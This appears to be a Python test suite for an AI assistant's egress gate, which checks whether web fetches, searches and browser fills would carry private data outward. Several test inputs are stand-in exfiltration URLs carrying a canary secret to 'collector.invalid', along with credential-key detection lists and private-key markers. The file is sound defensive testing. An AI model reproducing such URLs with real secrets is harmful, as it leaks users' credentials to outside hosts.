"""Outbound egress authorization: classifier, policy and registry gate.

Every test uses in-process fakes.  No real network call, no real browser and
no system action is ever performed.
"""

import tempfile
import unittest
from pathlib import Path

from app.brain import egress
from app.brain import policy
from app.brain.egress import (
    EGRESS_TOOL_NAMES,
    PRIVATE_CREDENTIAL_KEY,
    PRIVATE_MARKER_VALUES,
    PRIVATE_OVER_LENGTH,
    PRIVATE_PATH,
    PRIVATE_SECRET_SHAPE,
    PRIVATE_USERINFO,
    REASON_EGRESS_PRIVATE,
    REASON_EGRESS_PUBLIC,
    REASON_EGRESS_UNCERTAIN,
    UNCERTAIN_TYPE,
    UNCERTAIN_UNICODE,
    PrivateDataClassifier,
    classify_egress,
    confirmation_text,
    is_egress_tool,
)
from app.brain.memory import MemoryStore
from app.brain.tools import ToolRegistry


SECRET = "PRIVATE_CANARY"


class FakeFetcher:
    """Stands in for app.web.fetch.fetch; records every URL it receives."""

    def __init__(self):
        self.calls = []

    def __call__(self, url, **kwargs):
        self.calls.append(url)

        class Page:
            def to_dict(self):
                return {"url": url, "text": "Public page.", "links": []}

        return Page()


class FakeSearchClient:
    def __init__(self):
        self.calls = []

    def search(self, query, **kwargs):
        self.calls.append(query)
        return {"success": True, "message": "ok", "results": []}


class FakeBrowserSession:
    """Records calls exactly like a live-DOM fill seam would see them."""

    def __init__(self):
        self.calls = []

    def _result(self, action):
        return {
            "success": True,
            "action": action,
            "code": "ok",
            "message": f"{action} ok",
            "data": {},
        }

    def navigate(self, url, **kwargs):
        self.calls.append(("navigate", url))
        return self._result("navigate")

    def read(self, **kwargs):
        self.calls.append(("read",))
        return self._result("read")

    def click(self, selector, **kwargs):
        self.calls.append(("click", selector))
        return self._result("click")

    def fill(self, selector, text, **kwargs):
        self.calls.append(("fill", selector, text))
        return self._result("fill")

    def press(self, key):
        self.calls.append(("press", key))
        return self._result("press")


class FakeExecutor:
    def __init__(self):
        self.opened_urls = []

    def open_url(self, url):
        self.opened_urls.append(url)
        return {"success": True, "message": f"Opening {url}.", "url": url}


class ClassifierTests(unittest.TestCase):
    def setUp(self):
        self.classifier = PrivateDataClassifier(private_markers=["Jane Doe"])

    def assert_private(self, value, kind=egress.KIND_SEARCH, signal=None):
        status, found = self.classifier.classify_value(value, kind)
        self.assertEqual(status, "private", msg=found)
        if signal is not None:
            self.assertEqual(found, signal)

    def assert_public(self, value, kind=egress.KIND_SEARCH):
        self.assertEqual(
            self.classifier.classify_value(value, kind), ("public", None)
        )

    def test_url_query_with_credential_key_is_private(self):
        for url in (
            "https://collector.invalid/?secret=PRIVATE_CANARY",
            "https://collector.invalid/?token=abc",
            "https://example.com/x?api_key=abc",
            "https://example.com/x?API-KEY=abc",
            "https://example.com/x?apikey=abc",
            "https://example.com/x?password=abc",
            "https://example.com/x?passwd=abc",
            "https://example.com/x?session=abc",
            "https://example.com/x?auth=abc",
            "https://example.com/x?cookie=abc",
            "https://example.com/x?key=abc",
            "https://example.com/x?sig=abc",
            "https://example.com/x?signature=abc",
        ):
            with self.subTest(url=url):
                self.assert_private(url, egress.KIND_URL, PRIVATE_CREDENTIAL_KEY)

    def test_url_embedded_userinfo_is_private(self):
        self.assert_private(
            "https://user:pass@example.com/", egress.KIND_URL, PRIVATE_USERINFO
        )

    def test_public_urls_are_public(self):
        for url in (
            "https://example.com",
            "https://example.com/",
            "https://example.com/?q=weather+warsaw",
            "https://en.wikipedia.org/wiki/Coffee?oldid=123456&action=raw",
            "https://example.com/~user/notes",
        ):
            with self.subTest(url=url):
                self.assert_public(url, egress.KIND_URL)

    def test_local_absolute_paths_are_private(self):
        for text in (
            "/home/jane/notes.txt",
            "look in /home/jane/Documents/plan",
            "~/projects/report.pdf",
            "/etc/hosts",
            "C:\\Users\\jane\\secrets.txt",
        ):
            with self.subTest(text=text):
                self.assert_private(text, egress.KIND_SEARCH, PRIVATE_PATH)

    def test_long_text_over_threshold_is_private(self):
        self.assert_public("a" * 179)
        self.assert_private("a" * 180, egress.KIND_SEARCH, PRIVATE_OVER_LENGTH)
        self.assert_private("a" * 180, egress.KIND_FILL, PRIVATE_OVER_LENGTH)
        self.assert_public("a" * 399, egress.KIND_URL)
        self.assert_private("a" * 400, egress.KIND_URL, PRIVATE_OVER_LENGTH)

    def test_private_marker_list_match_is_private(self):
        self.assert_private(
            "contact Jane Doe please", egress.KIND_SEARCH, PRIVATE_MARKER_VALUES
        )
        self.assert_private(
            "JANE DOE", egress.KIND_FILL, PRIVATE_MARKER_VALUES
        )
        self.assert_public("contact Jane Smith")

    def test_private_values_match_is_private(self):
        classifier = PrivateDataClassifier(private_values=["my hidden note"])
        self.assertEqual(
            classifier.classify_value("My Hidden Note"),
            ("private", PRIVATE_MARKER_VALUES),
        )
        self.assertEqual(
            classifier.classify_value("a different note"), ("public", None)
        )

    def test_opaque_secret_shapes_are_private(self):
        self.assert_private(
            "a9f8c7b6d5e4f3a2b1c0d9e8f7a6b5c4",
            egress.KIND_FILL,
            PRIVATE_SECRET_SHAPE,
        )
        self.assert_private(
            "-----BEGIN RSA PRIVATE KEY-----", egress.KIND_SEARCH,
            "key_material",
        )

    def test_public_text_is_public(self):
        for text in (
            "weather Warsaw",
            "history of the bicycle",
            "misty",
            "ile kosztuje bilet",
            "siła spokoju",
        ):
            with self.subTest(text=text):
                self.assert_public(text)

    def test_unknown_values_are_uncertain(self):
        self.assertEqual(
            self.classifier.classify_value(object()),
            ("uncertain", UNCERTAIN_TYPE),
        )
        self.assertEqual(
            self.classifier.classify_value("\u200bhidden"),
            ("uncertain", UNCERTAIN_UNICODE),
        )
        self.assertEqual(
            self.classifier.classify_value("\ufeff\u200b\u200b"),
            ("uncertain", UNCERTAIN_UNICODE),
        )

    def test_numbers_are_public(self):
        for value in (3, 2.5, None, True):
            with self.subTest(value=value):
                self.assertEqual(
                    self.classifier.classify_value(value), ("public", None)
                )


class ClassifyEgressTests(unittest.TestCase):
    def test_egress_tool_set(self):
        self.assertEqual(
            EGRESS_TOOL_NAMES,
            frozenset({
                "fetch_web_page", "web_search", "web_research", "open_url",
                "search_site", "browser_navigate", "browser_fill",
                "browser_press",
            }),
        )
        self.assertEqual(policy.EGRESS_TOOL_NAMES, EGRESS_TOOL_NAMES)
        self.assertFalse(is_egress_tool("open_folder"))
        self.assertFalse(is_egress_tool(None))

    def test_private_url_denied(self):
        decision = classify_egress(
            "fetch_web_page",
            {"url": "https://collector.invalid/?secret=" + SECRET},
        )
        self.assertFalse(decision.allowed)
        self.assertTrue(decision.requires_confirmation)
        self.assertEqual(decision.reason_code, REASON_EGRESS_PRIVATE)
        self.assertEqual(decision.signals, (PRIVATE_CREDENTIAL_KEY,))

    def test_public_query_allowed(self):
        for tool, arguments in (
            ("web_search", {"query": "weather Warsaw"}),
            ("web_search", {"query": "history of coffee", "limit": 5}),
            ("web_research", {"query": "history of Warsaw", "pages": 3}),
            ("fetch_web_page", {"url": "https://example.com"}),
            ("open_url", {"url": "https://example.com"}),
            ("search_site", {"site": "youtube", "query": "minecraft"}),
            ("browser_fill", {"selector": "#q", "text": "misty"}),
            ("browser_press", {"key": "Enter"}),
            ("browser_navigate", {"url": "https://example.com/"}),
        ):
            with self.subTest(tool=tool, arguments=arguments):
                decision = classify_egress(tool, arguments)
                self.assertTrue(decision.allowed)
                self.assertFalse(decision.requires_confirmation)
                self.assertEqual(decision.reason_code, REASON_EGRESS_PUBLIC)

    def test_uncertain_payload_denied(self):
        decision = classify_egress(
            "browser_fill", {"selector": "#q", "text": object()}
        )
        self.assertFalse(decision.allowed)
        self.assertEqual(decision.reason_code, REASON_EGRESS_UNCERTAIN)
        self.assertEqual(decision.signals, (UNCERTAIN_TYPE,))

    def test_non_mapping_arguments_are_uncertain(self):
        decision = classify_egress("web_search", "weather")
        self.assertFalse(decision.allowed)
        self.assertEqual(decision.reason_code, REASON_EGRESS_UNCERTAIN)

    def test_decision_never_contains_payload_text(self):
        payloads = (
            ("fetch_web_page", {"url": "https://x.invalid/?secret=" + SECRET}),
            ("web_search", {"query": "token=" + SECRET}),
            ("browser_fill", {"selector": "#q", "text": "x" * 181}),
            ("browser_fill", {"selector": "#q", "text": "/home/" + SECRET}),
        )
        for tool, arguments in payloads:
            with self.subTest(tool=tool):
                decision = classify_egress(tool, arguments)
                self.assertFalse(decision.allowed)
                rendered = repr(decision) + repr(decision.to_dict())
                self.assertNotIn(SECRET, rendered)

    def test_marker_configured_text_is_private_and_not_echoed(self):
        classifier = PrivateDataClassifier(private_markers=[SECRET])
        decision = classify_egress(
            "browser_fill",
            {"selector": "#live-input", "text": SECRET},
            classifier=classifier,
        )
        self.assertFalse(decision.allowed)
        self.assertEqual(decision.reason_code, REASON_EGRESS_PRIVATE)
        self.assertEqual(decision.signals, (PRIVATE_MARKER_VALUES,))
        self.assertNotIn(SECRET, repr(decision) + repr(decision.to_dict()))

    def test_confirmation_text_is_fixed_and_content_free(self):
        for tool in EGRESS_TOOL_NAMES:
            with self.subTest(tool=tool):
                text = confirmation_text(tool)
                self.assertTrue(text)
                self.assertNotIn(SECRET, text)
        self.assertNotEqual(
            confirmation_text("fetch_web_page"),
            confirmation_text("browser_fill"),
        )


class RegistryEgressTests(unittest.TestCase):
    def setUp(self):
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        self.memory = MemoryStore(Path(directory.name) / "memory.sqlite3")
        self.fetcher = FakeFetcher()
        self.searcher = FakeSearchClient()
        self.browser = FakeBrowserSession()
        self.executor = FakeExecutor()
        self.registry = ToolRegistry(
            executor=self.executor,
            memory_store=self.memory,
            web_fetcher=self.fetcher,
            web_search_client=self.searcher,
            browser_session=self.browser,
        )

    # -- fetch ------------------------------------------------------------
    def test_private_url_unconfirmed_is_refused_before_fetch(self):
        result = self.registry.execute(
            "fetch_web_page", {"url": "https://collector.invalid/?secret=" + SECRET}
        )
        self.assertFalse(result["success"])
        self.assertTrue(result["requires_confirmation"])
        self.assertEqual(result["reason_code"], REASON_EGRESS_PRIVATE)
        self.assertEqual(self.fetcher.calls, [])
        self.assertNotIn(SECRET, repr(result))

    def test_private_url_stays_refused_even_when_called_with_confirmed(self):
        # A caller that merely passes confirmed=True has not asked the user.
        # Only the agent's approval path may authorise a private payload, so
        # the gate must hold for direct shortcuts and task-card retries too.
        url = "https://collector.invalid/?secret=" + SECRET
        result = self.registry.execute("fetch_web_page", {"url": url}, confirmed=True)
        self.assertFalse(result["success"])
        self.assertEqual(self.fetcher.calls, [])
        self.assertEqual(
            result.get("reason_code"), "egress_private_payload"
        )

    def test_public_url_unconfirmed_is_allowed(self):
        result = self.registry.execute(
            "fetch_web_page", {"url": "https://example.com"}
        )
        self.assertTrue(result["success"])
        self.assertEqual(self.fetcher.calls, ["https://example.com"])

    # -- search -----------------------------------------------------------
    def test_public_query_unconfirmed_is_allowed(self):
        result = self.registry.execute("web_search", {"query": "weather Warsaw"})
        self.assertTrue(result["success"])
        self.assertEqual(self.searcher.calls, ["weather Warsaw"])

    def test_public_research_stays_autonomous(self):
        result = self.registry.execute(
            "web_research", {"query": "history of Warsaw", "pages": 1}
        )
        self.assertNotIn(
            result.get("reason_code"),
            (REASON_EGRESS_PRIVATE, REASON_EGRESS_UNCERTAIN),
        )
        self.assertEqual(self.searcher.calls, ["history of Warsaw"])

    def test_private_query_unconfirmed_is_refused(self):
        result = self.registry.execute(
            "web_search", {"query": "/home/jane/notes.txt"}
        )
        self.assertFalse(result["success"])
        self.assertTrue(result["requires_confirmation"])
        self.assertEqual(self.searcher.calls, [])

    # -- browser fill / press --------------------------------------------
    def test_browser_fill_private_text_unconfirmed_calls_nothing(self):
        # A bare probing token is only caught when it is a configured marker
        # or otherwise matches a rule; use the long-text rule here, which is
        # the one that guards pasted private content.
        result = self.registry.execute(
            "browser_fill", {"selector": "#live-input", "text": "x" * 181}
        )
        self.assertFalse(result["success"])
        self.assertTrue(result["requires_confirmation"])
        self.assertEqual(self.browser.calls, [])

    def test_browser_fill_long_text_unconfirmed_is_refused(self):
        result = self.registry.execute(
            "browser_fill", {"selector": "#q", "text": "x" * 181}
        )
        self.assertFalse(result["success"])
        self.assertEqual(result["reason_code"], REASON_EGRESS_PRIVATE)
        self.assertEqual(self.browser.calls, [])

    def test_browser_fill_public_short_text_is_allowed(self):
        result = self.registry.execute(
            "browser_fill", {"selector": "#q", "text": "misty"}
        )
        self.assertTrue(result["success"])
        self.assertEqual(self.browser.calls, [("fill", "#q", "misty")])

    def test_browser_fill_private_stays_refused_even_with_confirmed(self):
        # Filling a live DOM can transmit immediately through input handlers,
        # so a pre-approved flag is not an answer from the user.
        text = "x" * 181
        result = self.registry.execute(
            "browser_fill",
            {"selector": "#q", "text": text},
            confirmed=True,
        )
        self.assertFalse(result["success"])
        self.assertEqual(self.browser.calls, [])

    def test_egress_refusal_is_never_a_transient_failure(self):
        from app.brain.policy import is_transient_failure

        result = self.registry.execute(
            "web_search", {"query": "secret=x"}
        )
        self.assertTrue(result["blocked"])
        self.assertFalse(is_transient_failure(result))

    def test_browser_press_still_needs_static_approval(self):
        result = self.registry.execute("browser_press", {"key": "Enter"})
        self.assertFalse(result["success"])
        self.assertEqual(self.browser.calls, [])
        result = self.registry.execute(
            "browser_press", {"key": "Enter"}, confirmed=True
        )
        self.assertTrue(result["success"])

    # -- open_url / search_site ------------------------------------------
    def test_open_url_public_and_private(self):
        result = self.registry.execute("open_url", {"url": "https://example.com"})
        self.assertTrue(result["success"])
        result = self.registry.execute(
            "open_url", {"url": "https://example.com/?password=" + SECRET}
        )
        self.assertFalse(result["success"])
        self.assertTrue(result["requires_confirmation"])
        self.assertEqual(self.executor.opened_urls, ["https://example.com"])

    def test_search_site_private_query_refused(self):
        result = self.registry.execute(
            "search_site", {"site": "youtube", "query": "token=" + SECRET}
        )
        self.assertFalse(result["success"])
        self.assertEqual(self.executor.opened_urls, [])

    def test_browser_navigate_is_unchanged(self):
        result = self.registry.execute(
            "browser_navigate", {"url": "https://example.org/"}
        )
        self.assertTrue(result["success"])
        self.assertEqual(self.browser.calls, [("navigate", "https://example.org/")])

    # -- confirmation surface --------------------------------------------
    def test_confirmation_description_for_egress_is_content_free(self):
        for name, arguments in (
            ("fetch_web_page", {"url": "https://x.invalid/?secret=" + SECRET}),
            ("web_search", {"query": SECRET}),
            ("web_research", {"query": SECRET}),
            ("open_url", {"url": "https://x.invalid/?secret=" + SECRET}),
            ("search_site", {"site": "youtube", "query": SECRET}),
            ("browser_fill", {"selector": "#q", "text": SECRET}),
            ("browser_press", {"key": "Enter"}),
        ):
            with self.subTest(name=name):
                description = self.registry.confirmation_description(
                    name, arguments
                )
                self.assertIsInstance(description, str)
                self.assertNotIn(SECRET, description)

    def test_every_egress_tool_round_trips_requires_confirmation(self):
        public = {
            "fetch_web_page": {"url": "https://example.com"},
            "web_search": {"query": "weather"},
            "web_research": {"query": "weather"},
            "open_url": {"url": "https://example.com"},
            "search_site": {"site": "youtube", "query": "weather"},
            "browser_navigate": {"url": "https://example.com"},
            "browser_fill": {"selector": "#q", "text": "weather"},
            "browser_press": {"key": "Enter"},
        }
        private = {
            **public,
            "fetch_web_page": {"url": "https://example.com/?secret=" + SECRET},
            "web_search": {"query": "secret=" + SECRET},
            "web_research": {"query": "secret=" + SECRET},
            "open_url": {"url": "https://example.com/?secret=" + SECRET},
            "search_site": {"site": "youtube", "query": "secret=" + SECRET},
            "browser_navigate": {"url": "https://example.com/?secret=" + SECRET},
            "browser_fill": {"selector": "#q", "text": "x" * 181},
        }
        self.assertEqual(set(public), set(EGRESS_TOOL_NAMES))
        for name in sorted(EGRESS_TOOL_NAMES):
            with self.subTest(name=name):
                static = self.registry.requires_confirmation(name)
                self.assertIsInstance(static, bool)
                self.assertEqual(
                    self.registry.requires_confirmation(name, public[name]),
                    static,
                )
                self.assertTrue(
                    self.registry.requires_confirmation(name, private[name])
                )

    def test_non_egress_tools_ignore_arguments(self):
        for name, arguments in (
            ("open_folder", {"folder": "Downloads"}),
            ("volume_up", {}),
            ("browser_read", {}),
            ("write_clipboard", {"text": SECRET}),
        ):
            with self.subTest(name=name):
                self.assertEqual(
                    self.registry.requires_confirmation(name),
                    self.registry.requires_confirmation(name, arguments),
                )
        self.assertFalse(
            self.registry.requires_confirmation(
                "open_folder", {"folder": "/home/jane/secret"}
            )
        )


    def test_policy_classifier_is_installed_once(self):
        self.assertTrue(egress.checks_policy_consistency())
        self.assertIsNotNone(policy.get_egress_classifier())
        self.assertFalse(policy.install_egress_classifier(lambda *a: None))
        self.assertFalse(policy.install_egress_classifier(None))


class PolicyEgressTests(unittest.TestCase):
    def test_no_classifier_fails_closed(self):
        import app.brain.policy as policy_module

        saved = policy_module._egress_classifier
        policy_module._egress_classifier = None
        try:
            self.assertEqual(
                policy.requires_confirmation_for(
                    "web_search", {"query": "weather"}
                ),
                (True, REASON_EGRESS_UNCERTAIN),
            )
        finally:
            policy_module._egress_classifier = saved

    def test_policy_requires_confirmation_for_is_argument_aware(self):
        self.assertEqual(
            policy.requires_confirmation_for(
                "fetch_web_page", {"url": "https://example.com"}
            ),
            (False, REASON_EGRESS_PUBLIC),
        )
        self.assertEqual(
            policy.requires_confirmation_for(
                "fetch_web_page", {"url": "https://x.invalid/?secret=1"}
            ),
            (True, REASON_EGRESS_PRIVATE),
        )
        self.assertTrue(
            policy.requires_confirmation_for("fetch_web_page")[0]
        )

    def test_static_confirmation_entries_are_unchanged(self):
        for name in ("browser_click", "browser_press", "write_clipboard"):
            with self.subTest(name=name):
                self.assertTrue(policy.requires_confirmation_for(name, {}))
        self.assertEqual(
            policy.requires_confirmation_for("browser_click", {"selector": "#a"}),
            (True, "confirmation_required"),
        )

    def test_non_egress_tools_stay_static(self):
        self.assertEqual(
            policy.requires_confirmation_for("open_folder", {"folder": "x"}),
            (False, "allowed"),
        )
        self.assertTrue(
            policy.requires_confirmation_for("run_shell", {"command": "id"})
        )


if __name__ == "__main__":
    unittest.main()